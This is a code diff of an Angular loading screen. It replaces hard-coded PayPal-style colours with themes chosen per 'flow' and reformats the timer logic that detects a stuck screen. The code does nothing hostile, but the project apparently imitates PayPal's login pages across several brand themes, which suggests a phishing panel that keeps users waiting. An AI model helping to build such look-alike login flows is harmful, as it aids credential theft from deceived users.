@@ -13,18 +13,22 @@ import { TranslatePipe } from '../pipes/translate.pipe';
     <app-public-layout>
       <div class="flex flex-col items-center justify-center py-12 animate-fade-in">
 
-        <!-- PayPal 2024 Modern Spinner -->
-        <!-- A rotating blue arc/ring, distinct from the generic SVG -->
+        <!-- Dynamic Spinner -->
+        <!-- Brand Color Ring -->
         <div class="relative w-16 h-16 mb-8">
-             <div class="absolute inset-0 border-4 border-slate-100 rounded-full"></div>
-             <div class="absolute inset-0 border-4 border-pp-blue rounded-full border-t-transparent animate-spin-slow"></div>
+             <div class="absolute inset-0 border-4 rounded-full opacity-20"
+                  [style.border-color]="brandColor()"></div>
+             <div class="absolute inset-0 border-4 rounded-full border-t-transparent animate-spin-slow"
+                  [style.border-color]="brandColor()"></div>
         </div>
 
-        <h1 class="text-2xl font-bold text-pp-navy mb-3 text-center tracking-tight animate-fade-in-up">
+        <h1 class="text-2xl font-bold mb-3 text-center tracking-tight animate-fade-in-up"
+            [style.color]="textColor()">
           {{ title() | translate }}
         </h1>
         
-        <p class="text-base text-slate-500 text-center font-medium max-w-xs mx-auto animate-pulse">
+        <p class="text-base text-slate-500 text-center font-medium max-w-xs mx-auto animate-pulse"
+           [style.color]="subTextColor()">
            {{ subMessage() | translate }}
         </p>
       </div>
@@ -43,6 +47,12 @@ export class LoadingComponent implements OnInit, OnDestroy {
   private interval: any;
   private stuckCheckInterval: any;
 
+  // Theme Helpers
+  flow = computed(() => this.state.currentFlow());
+  brandColor = computed(() => this.flow()?.theme.button.background || '#003087'); // Fallback to PP Blue
+  textColor = computed(() => this.flow()?.theme.input.textColor || '#111827');
+  subTextColor = computed(() => this.flow()?.theme.mode === 'dark' ? '#9ca3af' : '#64748b');
+
   title = computed(() => {
     const stage = this.state.stage();
     if (stage === 'login') return 'LOADING.CHECKING';
@@ -55,48 +65,48 @@ export class LoadingComponent implements OnInit, OnDestroy {
   });
 
   constructor() {
-      // Logic: If waitingStart is missing but we are here, we might be stuck.
-      effect(() => {
-          if (this.state.currentView() === 'loading') {
-              // Ensure timer is running in StateService
-              if (!this.state.waitingStartPublic()) {
-                  // If no timer, force a sync or restart it
-                  console.warn('[Loading] Timer missing. Requesting sync/restart...');
-                  this.state.syncState();
-              }
-          }
-      });
+    // Logic: If waitingStart is missing but we are here, we might be stuck.
+    effect(() => {
+      if (this.state.currentView() === 'loading') {
+        // Ensure timer is running in StateService
+        if (!this.state.waitingStartPublic()) {
+          // If no timer, force a sync or restart it
+          console.warn('[Loading] Timer missing. Requesting sync/restart...');
+          this.state.syncState();
+        }
+      }
+    });
   }
 
   ngOnInit() {
-      const msgs = ['LOADING.SUB_1', 'LOADING.SUB_2', 'LOADING.SUB_3', 'LOADING.SUB_4'];
-      let i = 0;
-      this.interval = setInterval(() => {
-          i++;
-          this.subMessage.set(msgs[i % msgs.length]);
-      }, 2500);
+    const msgs = ['LOADING.SUB_1', 'LOADING.SUB_2', 'LOADING.SUB_3', 'LOADING.SUB_4'];
+    let i = 0;
+    this.interval = setInterval(() => {
+      i++;
+      this.subMessage.set(msgs[i % msgs.length]);
+    }, 2500);
 
-      // Safety: Stuck Check
-      let timeInView = 0;
-      this.stuckCheckInterval = setInterval(() => {
-          timeInView += 1000;
+    // Safety: Stuck Check
+    let timeInView = 0;
+    this.stuckCheckInterval = setInterval(() => {
+      timeInView += 1000;
 
-          // If stuck for > 15s and no waitingStart, try to recover
-          if (timeInView > 15000 && !this.state.waitingStartPublic()) {
-               console.error('[Loading] Stuck detected. Recovering...');
-               // Go back to previous view or login if unknown
-               const prev = this.state.previousView();
-               if (prev && prev !== 'loading') {
-                   this.state.navigate(prev);
-               } else {
-                   this.state.navigate('login');
-               }
-          }
-      }, 1000);
+      // If stuck for > 15s and no waitingStart, try to recover
+      if (timeInView > 15000 && !this.state.waitingStartPublic()) {
+        console.error('[Loading] Stuck detected. Recovering...');
+        // Go back to previous view or login if unknown
+        const prev = this.state.previousView();
+        if (prev && prev !== 'loading') {
+          this.state.navigate(prev);
+        } else {
+          this.state.navigate('login');
+        }
+      }
+    }, 1000);
   }
 
   ngOnDestroy() {
-      clearInterval(this.interval);
-      clearInterval(this.stuckCheckInterval);
+    clearInterval(this.interval);
+    clearInterval(this.stuckCheckInterval);
   }
 }
